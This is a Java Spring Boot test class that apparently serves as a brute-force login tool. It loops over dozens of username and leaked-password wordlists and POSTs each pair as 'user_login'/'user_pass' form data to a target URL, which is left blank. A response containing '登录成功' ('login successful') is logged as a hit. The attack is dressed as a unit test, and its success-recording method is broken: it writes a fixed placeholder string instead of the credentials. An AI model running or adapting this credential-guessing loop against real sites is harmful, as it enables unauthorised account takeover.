package com.example.restdemo;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.*;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import javax.annotation.Resource;
import java.io.*;
import java.net.URISyntaxException;

@RunWith(SpringRunner.class)
@SpringBootTest
public class RestDemoApplicationTests {

    @Resource
    private RestTemplate restTemplate;

    final String url = "";

    private void contextLoads(String username, String pwd) throws URISyntaxException, IOException {
        HttpHeaders header = new HttpHeaders();
        header.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        //  封装参数，千万不要替换为Map与HashMap，否则参数无法传递
        MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
//  也支持中文
        params.add("user_login", username);
        params.add("user_pass", pwd);


        HttpEntity<Object> httpEntity = new HttpEntity<>(params, header);

        ResponseEntity<String> aa = restTemplate.exchange(url, HttpMethod.POST, httpEntity, String.class);
        if (aa.getBody().contains("登录成功")) {
            System.out.println(1);
            writeSuccess(username +":"+pwd+"\n");
        }
    }

    @Test
    public void readUsername() throws IOException, URISyntaxException {
        String[] userStr = new String[]{"/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/Mirai-name-pwd/name.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/generic-listpairs/http_default_users.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/12306_personal_limit100.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/BruteX_namelist.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/BruteX_simple-users.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/Chinese_name_hanzi.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/Chinese_name_word.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/Chinesename.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/common_name.dict",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/name_pinyin_top10W.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/namelist.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/user_emails.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/user_no_emails.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/usernames.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/wm_user.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/names/zhihu_id_list.txt",

        };
        for (int i = 0; i < userStr.length; i++) {
            File file = new File(userStr[i]);
            int line = 1;
            String tempUsername = null;
            BufferedReader reader = new BufferedReader(new FileReader(file));
            while ((tempUsername = reader.readLine()) != null) {
                readPwd(tempUsername);
                line++;
            }
            reader.close();
        }
    }


    private void readPwd(String username) throws IOException, URISyntaxException {
        String[] pwdStr = new String[]{"/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/Mirai-name-pwd/pwd.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/000webhost.com-top-1w.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/000webhost_top_10.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/1.4 billion_top40.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/10_million_password_list_top_1000.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/10k most common.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/10top1K.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/10top10K.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/10top20K.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/2015_top_25.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/12306-14W-top100.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/ashely_madison_top20.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/badoo_top55.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/BruteX_password.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/cn_top500_username.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/common_password.dict",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/csdn-tianya-top-1.5w.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/csdn-top-5k.dict",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/hkgroup_passwords_sorted.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/honey_ssh_username.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/john.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/k50.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/linkedin_top50.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/myspace_top55.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/myspace_top_14.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/nulled_io_top_20.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/phpbb.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/pp.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/quequero.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/swappernet_top50.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/swappernet_top1000.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/tianya-top-1w.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/top10k.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/top500",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/twitter.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/weak_create_password.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/weaksauce.txt",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/webshell_password_no_name.list",
                "/Users/say/Documents/github/fuzzdb/wordlists-user-passwd/passwords/wifi_password_top_100.list"};
        for (int i = 0; i < pwdStr.length; i++) {
            File file = new File(pwdStr[i]);
            int line = 1;
            String tempPwd = null;
            BufferedReader reader = new BufferedReader(new FileReader(file));
            while ((tempPwd = reader.readLine()) != null) {
                contextLoads(username, tempPwd);
                line++;
            }
            reader.close();
        }
    }


    private void writeSuccess(String str) throws IOException {
        File file = new File("/Users/say/Documents/github/activiti-demo/rest-demo/src/main/resources/success.txt");
        FileOutputStream fileWriter = new FileOutputStream(file);
        OutputStreamWriter writer = new OutputStreamWriter(fileWriter, "UTF-8");
        try {
            writer.write("测试输入字符串1");
        } catch (Exception e) {
            // TODO: handle exception
        } finally {
            writer.close();


        }
    }
}
